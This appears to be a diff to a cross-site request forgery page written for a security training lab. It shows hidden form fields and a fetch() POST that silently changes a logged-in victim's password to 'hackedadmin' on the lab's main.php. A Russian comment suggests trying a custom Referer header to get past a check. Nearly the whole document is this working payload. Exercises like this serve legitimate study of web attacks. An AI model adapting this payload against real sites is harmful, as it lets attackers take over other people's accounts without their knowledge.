@@ -1,11 +1,19 @@
 <html>
   <body>
-    <form action="http:// http://web.ygvqaa4qrdzijcdljzdc.labs.cyber-ed.space//main.php" method="POST">
+    <form action="http://web.ygvqaa4qrdzijcdljzdc.labs.cyber-ed.space/main.php" method="POST" id="f">
       <input type="hidden" name="action" value="change_password">
       <input type="hidden" name="new_password" value="hackedadmin">
     </form>
     <script>
-      document.forms[0].submit();
+  // Попробуй отправить с кастомным referer через fetch
+      fetch('http://web.ygvqaa4qrdzijcdljzdc.labs.cyber-ed.space/main.php', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded',
+          'Referer': 'http://web.ygvqaa4qrdzijcdljzdc.labs.cyber-ed.space/main.php'
+        },
+        body: 'action=change_password&new_password=hackedadmin'
+      });
     </script>
   </body>
 </html>
